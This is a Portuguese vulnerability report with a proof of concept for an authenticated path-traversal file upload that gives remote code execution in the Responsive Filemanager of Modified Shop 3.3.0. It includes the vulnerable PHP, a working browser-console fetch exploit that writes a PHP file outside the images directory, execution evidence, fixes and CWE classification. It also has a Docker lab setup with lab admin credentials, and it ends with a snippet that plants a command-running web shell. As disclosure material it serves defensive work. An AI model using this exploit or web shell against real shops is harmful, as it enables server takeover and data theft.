# Authenticated Arbitrary File Upload leading to Remote Code Execution in Modified Shop File Manager

## Resumo

Foi identificada uma vulnerabilidade no componente Responsive Filemanager integrado ao Modified Shop 3.3.0 rev. 16825.

A funcionalidade `save_img`, disponível em: `/admin/includes/modules/filemanager/ajax_calls.php?action=save_img` permite que um usuário com sessão administrativa válida grave conteúdo arbitrário em arquivos no servidor.

O parâmetro `name` é concatenado diretamente ao caminho físico, sem validação contra path traversal ou restrição de extensão. Embora o parâmetro `path` seja submetido à função `checkRelativePath()`, essa validação não é aplicada ao parâmetro `name`.

Foi possível gravar um arquivo PHP fora do diretório de imagens, dentro de `/export/`, e acessá-lo por HTTP. O Apache interpretou o código PHP e retornou o marcador definido na PoC.

**Impacto: execução remota de código PHP (RCE) no contexto do usuário do servidor web.**

## Identificação

| Campo | Informação |
|---|---|
| Vulnerabilidade | Arbitrary File Upload / Path Traversal leading to RCE |
| Componente | Responsive Filemanager |
| Endpoint | `/admin/includes/modules/filemanager/ajax_calls.php` |
| Ação | `save_img` |
| Método | POST |
| Parâmetros relevantes | `path`, `name`, `url` |
| Versão testada | Modified Shop 3.3.0 rev. 16825 |
| Autenticação | Sessão administrativa válida e sessão RF |
| Resultado | RCE confirmado |


## Análise técnica

### 1. Controle de sessão

O endpoint verifica a existência do identificador de sessão do File Manager:

```php
if ($_SESSION['RF']["verify"] != "RESPONSIVEfilemanager") {
    response(trans('forbidden').AddErrorLocation())->send();
    exit;
}
```

Portanto, a exploração demonstrada depende de uma sessão válida com o contexto RF inicializado.

### 2. Validação incompleta do caminho

O código valida `$_POST['path']`:

```php
if(isset($_POST['path']) && !checkRelativePath($_POST['path'])) {
    response(trans('wrong path').AddErrorLocation())->send();
    exit;
}
```

Entretanto, não aplica validação equivalente a `$_POST['name']`.

A função `checkRelativePath()` identifica sequências de traversal como `../`, `./` e suas variantes codificadas, mas sua aplicação não protege o parâmetro `name`.

### 3. Ausência de validação efetiva do conteúdo e da extensão

Na ação `save_img`, o código executa:

```php
$info = pathinfo($_POST['name']);
$image_data = $_POST['url'];

if (preg_match('/^data:image\/(\w+);base64,/', $image_data, $type)) {
    $image_data = substr($image_data, strpos($image_data, ',') + 1);
    $type = strtolower($type[1]);

    $image_data = base64_decode($image_data);
}
```

A expressão regular verifica apenas o prefixo Data URI. Não comprova que o conteúdo seja uma imagem válida nem impede que o conteúdo decodificado contenha código PHP.

Embora `pathinfo()` seja utilizado, o resultado `$info` não é empregado para restringir a extensão do arquivo.

### 4. Gravação arbitrária

A configuração define:

```php
'current_path' => '../../../../images/',
```

Porém, a gravação utiliza diretamente os valores recebidos:

```php
file_put_contents(
    $config['current_path'] . $_POST['path'] . $_POST['name'],
    $image_data
);
```

O parâmetro `name` pode conter uma sequência de diretórios relativos, permitindo que a gravação ultrapasse o diretório configurado para upload.

## Prova de conceito (PoC)

### Requisição utilizada

Endpoint:

```http
POST /admin/includes/modules/filemanager/ajax_calls.php?action=save_img
Content-Type: application/x-www-form-urlencoded
```

Parâmetros:

```text
path=
name=../export/RS_FILEMANAGER_EXPORT_TEST33.php
url=data:image/png;base64,BASE64_DO_CONTEUDO
```

Conteúdo PHP utilizado:

```php
<?php echo 'RS_FILEMANAGER_PHP_EXEC'; ?>
```

### PoC com JavaScript Fetch

Executar no console do navegador com a sessão administrativa e o File Manager inicializados:

```javascript
(async () => {
  const endpoint =
    "/admin/includes/modules/filemanager/ajax_calls.php?action=save_img";

  const php = "<?php echo 'RS_FILEMANAGER_PHP_EXEC'; ?>";

  const body = new URLSearchParams({
    path: "",
    name: "../export/RS_FILEMANAGER_EXPORT_TEST33.php",
    url: "data:image/png;base64," + btoa(php)
  });

  const response = await fetch(endpoint, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body,
    credentials: "same-origin",
    cache: "no-store"
  });

  console.log({
    status: response.status,
    response: await response.text()
  });
})();
```

### Evidência de gravação

O arquivo foi encontrado no seguinte caminho:

```text
/var/www/html/export/RS_FILEMANAGER_EXPORT_TEST33.php
```

Resultado:

```text
-rw-r--r-- 1 www-data www-data 40 Nov 5 18:02 RS_FILEMANAGER_EXPORT_TEST33.php
```

Conteúdo:

```php
<?php echo 'RS_FILEMANAGER_PHP_EXEC'; ?>
```

### Evidência de execução remota

Requisição realizada:

```bash
curl -i --max-time 10 \
  http://127.0.0.1/export/RS_FILEMANAGER_EXPORT_TEST33.php
```

Resposta:

```http
HTTP/1.1 200 OK
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.1.34
Content-Type: text/html; charset=UTF-8

RS_FILEMANAGER_PHP_EXEC
```

O conteúdo PHP foi interpretado pelo servidor, em vez de ser entregue como código-fonte.

A execução do marcador confirma a capacidade de executar código PHP arbitrário gravado por meio da funcionalidade vulnerável.

## Impacto

Um usuário que consiga utilizar o File Manager com uma sessão administrativa válida poderá gravar arquivos PHP em diretórios acessíveis pelo servidor web.

As consequências potenciais incluem:

- Execução remota de código PHP.
- Comprometimento da aplicação e dos dados acessíveis pelo usuário do servidor web.
- Leitura e alteração de arquivos conforme as permissões do processo PHP.
- Instalação de backdoors persistentes.
- Comprometimento de outros componentes hospedados no mesmo ambiente, dependendo das permissões e do isolamento.

A PoC demonstrou execução de PHP no contexto do servidor web. Não foi necessário executar comandos do sistema operacional para confirmar a vulnerabilidade.

## Recomendações

1. Aplicar validação de segurança tanto em `path` quanto em `name`.
2. Rejeitar nomes contendo separadores de diretório e sequências de traversal.
3. Restringir as extensões permitidas a uma lista explícita de formatos de imagem.
4. Validar o conteúdo real da imagem, preferencialmente decodificando e recriando a imagem no servidor.
5. Utilizar caminhos absolutos e validar o destino final com `realpath()`, garantindo que permaneça dentro do diretório autorizado.
6. Impedir a execução de PHP em diretórios destinados a arquivos enviados por usuários.
7. Revisar permissões de escrita do usuário do servidor web e limitar o acesso ao File Manager.
8. Implementar proteção CSRF e verificar a autorização da operação em cada requisição.

## Classificação

- CWE-434 — Unrestricted Upload of File with Dangerous Type.
- CWE-22 — Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').
- CWE-94 — Improper Control of Generation of Code ('Code Injection').

## Conclusão

A vulnerabilidade foi confirmada por análise estática e exploração dinâmica no Modified Shop 3.3.0 rev. 16825.

A funcionalidade `save_img` permite gravar conteúdo PHP fora do diretório de upload configurado, por meio da manipulação do parâmetro `name`. O arquivo resultante é acessível via HTTP e executado pelo interpretador PHP do Apache.

**Status: Confirmado — Arbitrary File Upload + Path Traversal leading to Remote Code Execution (RCE).**

A exploração demonstrada requer uma sessão administrativa válida com o File Manager inicializado.

## Deploy Enviroment
### Update and Upgrade Linnux host
```
sudo apt update && sudo apt upgrade -y
```

### Install Docker and Docker Compose
```
sudo apt install -y docker.io docker-compose
```

### Create Folder and Navigate to Directory
```
mkdir modified-shop-web && cd modified-shop-web
```

### Download Docker File
```
wget https://raw.githubusercontent.com/smithbraz/PoC-Modified-Shop/refs/heads/main/docker-compose.yml
```

### Create Config File
```
mkdir config
```
```
nano config/configure.php
```
```
<?php
define('HTTP_SERVER', 'http://IP_Address:8080');
define('HTTPS_SERVER', 'http://IP_Address:8080');

include_once dirname(__DIR__) . '/configure.php';

```

### Deploy WebApp
```
sudo docker compose up
```
or 
```
sudo docker compose up -d
```

## Credenciais:
```
email: admin@redscan.local
Password: RedScan@2026!
```



```
(async () => {
  const r = await fetch(
    "/admin/includes/modules/filemanager/dialog.php",
    {
      credentials: "same-origin",
      cache: "no-store"
    }
  );

  console.log({
    status: r.status,
    body: (await r.text()).slice(0, 120)
  });
})();
```

```
fetch('/admin/includes/modules/filemanager/ajax_calls.php?action=save_img', {
  method: 'POST',
  headers: {'Content-Type':'application/x-www-form-urlencoded'},
  body: new URLSearchParams({
    path: '',
    name: '../export/shell.php',
    url: 'data:image/png;base64,' + btoa("<?php echo shell_exec($_GET['cmd']); ?>")
  })
}).then(async r => console.log('HTTP', r.status, await r.text()))
```
